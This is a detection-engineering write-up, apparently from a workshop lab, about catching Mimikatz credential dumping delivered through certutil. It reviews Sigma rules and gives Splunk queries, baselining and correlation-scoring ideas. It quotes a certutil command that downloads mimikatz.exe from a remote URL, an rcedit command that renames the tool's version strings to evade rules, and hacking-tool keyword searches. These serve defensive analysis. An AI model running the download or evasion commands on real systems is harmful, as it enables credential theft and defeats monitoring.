# Detection analysis

## What is under attacker control
The threat actor chose to use LOLBIN as part of their tooling. The TTPs vary in terms of complexity (additional stealth) and associated detection opportunities (behavior vs signature).
```
[ITSERVER:PowerShell] certutil -urlcache -f https://github.com/MihhailSokolov/SecTools/raw/main/mimikatz.exe C:\Temp\m.exe
```
## What did we actually look for
Rules triggered by elements under attacker control are likely to have a shorter lifetime than those based on behaviors, we need to know where we are on the Pyramid of Pain. 

### Mimikatz 
| # | Search | ATT&CK Techniques | Notes | Dependencies |
|---|--------|-------------------|-------|--------------|
| 3 | [file_event_win_hktl_mimikatz_files.yml](https://github.com/SigmaHQ/sigma/blob/4f4ef7a8cc077b2b54c71c598db50fe8b1f14d55/rules/windows/file/file_event/file_event_win_hktl_mimikatz_files.yml#L4) | [T1558](https://attack.mitre.org/techniques/T1558) | File extensions, operator decisions, hardcoded behavior of an open source tool | File writes being logged (Security 4663 OR EDR hooks)|
| 21 | [sysmon_mimikatz_detection_lsass.yml](https://github.com/SigmaHQ/sigma/blob/4f4ef7a8cc077b2b54c71c598db50fe8b1f14d55/deprecated/windows/sysmon_mimikatz_detection_lsass.yml#L4) | [T1003](https://attack.mitre.org/techniques/T1003) | Already has silenced normal behavior allowing services and apps, which can be tampered with | Legacy environment, Non default noisy auditing of access |
| 23 | [win_alert_mimikatz_keywords.yml](https://github.com/SigmaHQ/sigma/blob/4f4ef7a8cc077b2b54c71c598db50fe8b1f14d55/rules/windows/builtin/win_alert_mimikatz_keywords.yml#L4) | [T1003.001](https://attack.mitre.org/techniques/T1003/001), [T1003.002](https://attack.mitre.org/techniques/T1003/002), [T1003.004](https://attack.mitre.org/techniques/T1003/004), [T1003.006](https://attack.mitre.org/techniques/T1003/006) | Keywords found in CLI only, operator decisions, hardcoded behavior of an open source tool | CLI args logging in 4688, 4663 auditing |

### Certutil
| # | Search | ATT&CK Techniques | Notes | Dependencies |
|---|--------|-------------------|-------|--------------|
| 5 | [net_connection_win_certutil_initiated_connection.yml](https://github.com/SigmaHQ/sigma/blob/6fd57da13139643c6fe3e4a23276ca6ae9a6eec7/rules/windows/network_connection/net_connection_win_certutil_initiated_connection.yml#L2) | [T1105](https://attack.mitre.org/techniques/T1105) | two caracteristics under attacker control: the image filename ending with certutil.exe, and specific ports associated with SMB or HTTP traffic | CLI args logging in 4688, Process name (not PID) in Network event (i.e. not the windows firewall) |
| 12 | [proc_creation_win_certutil_download_file_sharing_domains.yml](https://github.com/SigmaHQ/sigma/blob/6fd57da13139643c6fe3e4a23276ca6ae9a6eec7/rules/windows/process_creation/proc_creation_win_certutil_download_file_sharing_domains.yml) | [T1027](https://attack.mitre.org/techniques/T1027) |two caracteristics under attacker control: the image filename ending with certutil.exe BUT the rule also specifically looks for Original Filename data (very selective), commandline arguments looking for known domains for filesharing, assuming there is no Open redirectors in place as part of the delivery. | We've added a dependency on Sysmon due to the presence of original filename | 
| 13 | [proc_creation_win_certutil_download.yml](https://github.com/SigmaHQ/sigma/blob/6fd57da13139643c6fe3e4a23276ca6ae9a6eec7/rules/windows/process_creation/proc_creation_win_certutil_download.yml#L2) | [T1027](https://attack.mitre.org/techniques/T1027)  |two caracteristics under attacker control: the image filename ending with certutil.exe BUT the rule also specifically looks for Original Filename data (very selective), commandline arguments looking for HTTP specifically (not SMB) and a specific verb ('urlcache ' or 'verifyctl '). | CLI args logging in 4688 | 

### Why LOLBAS are so challenging
Exploit developers think in terms of "primitives" e.g. [the write what where CWE](https://cwe.mitre.org/data/definitions/123.html) . In many environments, the use of certutil.exe is supposed to be rare. It is a so-called LOLBIN - Living Off the Land Binary, part of the bigger [LOLBAS (Applications and Scripts) family](https://lolbas-project.github.io/). Certutil's value lies in the fact that is signed by Microsoft and already installed. This offers one less "feature" or "capability" that the authors need to develop and embed in their toolkit to achieve their objectives. Detection opportunities for LOLBAS are multiple, and can yield some false positives as well as strong signals when the environment is known. 

# What can we do about it?
Many approaches can help to refine the detection, but boil down to three angles:
- improve the detection logic
- allowlist known-good events (baseline - True Positive Benign)
- correlate events (eliminate false positives)
However, just because you could doesn't mean you should. This incurrs additional effort and you should apply this approach strategically for high value detection use cases. In some cases, a complementary deception strategy focused around relevant TTPs will be the cheapest way forward.

In the workshop, we have encountered false negatives as specific detection rules (3, 21, 23) were not triggered by the operator. However, a lot of events were collected and match a simple string. We should consider many broader, potentially overlapping detections, acting as failover for rules which are be too specific. 

## How do we get started
### Good old strings
Looking for hacking tool strings and names without specifying a field or index, and expecting false positives and effectively treating them as triggers for enrichments, rather than a final product. 
In Splunk, search for the following strings
- "m.exe"
- "delpy"
- "mimikatz"

Recompiling or reproducing a subset of features of Mimikatz is notoriously sufficient to bypass many public detection rules around the tool, but not its behavior. A particular tool is [rcedit](https://github.com/electron/rcedit/releases) which can manipulate [version information strings]( https://learn.microsoft.com/en-us/windows/win32/menurc/versioninfo-resource?redirectedfrom=MSDN```). 
``` C:\Temp\rcedit.exe C:\Temp\m.exe --set-version-string OriginalFileName "miminomore.exe" --set-version-string FileDescription "You'll never catch me" --set-version-string ProductName "miminomore"```
Luckily, any credential dumper needs to interact with credential stores to be useful, be they in the Windows registry, in memory or in the Windows registry in memory. Detections of behavior are unfortunately less often found in native logs, but EDRs performing hooking of select system APIs or consume native providers (ETW). We thus need to look at anomalies in large amounts of data.

### Looking at anomalies (i.e. baselining behaviors at scale)
Parent and Child relationships: As part of the pass-the-hash step 10, powershell.exe was spawned with different commandline options. 
```
index=win powershell.exe CommandLine=* ParentImage=*  Image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" 
| rare  CommandLine by CurrentDirectory
```
This will yield a lot of activity from Ansible as part of provisioning of the lab. But should be relatively rare once a system is in production. You could exclude some terms easily using lookups.
```| search NOT "Administrator@attackrange.local"```

Windows logon behavior: As a process is emitting a login with the SecLogon Login mechanism, a 4624 event gets generated. Not many attributes are seen with two different target accounts 
```index=win  4624 TargetUserName!=TargetOutboundUserName TargetOutboundUserName!="-" ```

### Embrace True Positive Benign and False positives
According to statistics definition, Precision measures the accuracy of positive predictions, while recall measures the ability of the model to find all relevant instances. 
In our case, this means that we need to find the balance between detections that may be too specific and occur false negatives, and detections that may be too broad and cause attrition issues. Reducing the cost of handling a false positive alert is key to make sure your team doesn't burn out. Each detection should have guidance on how to be triaged to avoid paralysis analysis.

The triage differenciation is the hard work you need to perform, luckily only once, as you establish the detection. It is where correlation kicks in often required to run multiple queries in parallel - ideally as a "playbook" - when reviewing events with low fidelity, effectively treating them as triggers rather than a final product. 

### Modernize (if needed) the way you search your data
- Get used to leverage APIs and macros for your queries
- Script and parameterize your queries. Convert them to "tests" supporting Quality Assurance.
- Write playbooks to run advanced scenarios and elimitate false positives - convert them to "tests"

### Build baselines and a reusable knowledge base 
Baselining who is using what in your environment is an important step, as well as the intended use of tools and CLI args. As analysts map out the environment and what is "normal" - store this information in a knowledge base. Examples can be :
- Splunk lookups
- CSV files
- text files versioned

Baselining can apply against specific types of events such as kerberos service ticket issuance. 
- Who is requesting service tickets? 
- Which principals are running services where? 
Over time, you will likely notice the need to automatically enrich events (e.g. a simple IP -> Hostname PTR DNS lookup) before normalizing data and silencing events. Over time, the amount of noise will decrease, and you will be able to lower thresholds for alerts. 

#### Baselining pseudo-algorithm
```
for 30 days
  for each endpoint "signal"
  -- run a live query to know where $signal has been ran based on EVTX
    store one entry per system identified and record last sighting
  -- run a live query to know where $signal has been ran with prefetch (last executions, some handles)
    store one entry per system identified and record last sighting
  -- run a datalake query to know where $lsignal has been ran based on collected EDR data ( hooked events, Sysmon EID 1, Security EID 4688)
    store one entry per system identified and record last sighting
day++ 
```

### Notable events and correlation
While sigma can be a great start at quickly covering common use cases, it also suffers from the same constraints as vendor provided detections - most people can only afford to load entire rulesets and hope for the best, then turning off rules which are prone to false positives. The approach we would recommend is not to disable unreliable rules but handle their output differently. In particular, Splunk ES has the concept of "Notables", which are the result of correlation of multiple events of low fidelity with a score. Once a certain score per system is reached, a notable or incident is created. This concept can be recreated with limited effort, focusing on weaker signals to trigger further analysis, or retain context for potential investigations in the future.
- renamed binary = 5 points
- file written to disk = 5 points
- sensitive registry read = 10 points
- privilege logon event = 10 points
An approach for building correlation rules on the cheap can be found in [our example](splunk_correlation_search_examples.md). Such searches can be used to trigger additional data collection, build watch lists, populate lookups or automate toil away.

## Takeaways
However, to make some detections for complicated scenarios, you will need to turn to canaries and other early warning systems, and always assume that bypasses are possible. 
As such, consider many broader potentially overlapping detections, acting as failover for rules which may be too specific. A simple example approach would be to looking for hacking tool strings and names without specifying a field or index, and expecting false positives and effectively treating them as triggers for enrichments, rather than a final product. As a challenge, try to determine who is using PSEXEC in your environment and why.
 - is it to run code as system?
 - is it to run code on a remote system?
 - Can you detect usage of the legitimate, original PSExec binaries?
Later on, try and move up the pyramid based on the behaviors:
 - What about the clones of PSEXEC (PAExec, RMMs) using the same primitives? 
 - What services get created, started or stopped? 
 - What users create a service remotely using the Service Control Management API?
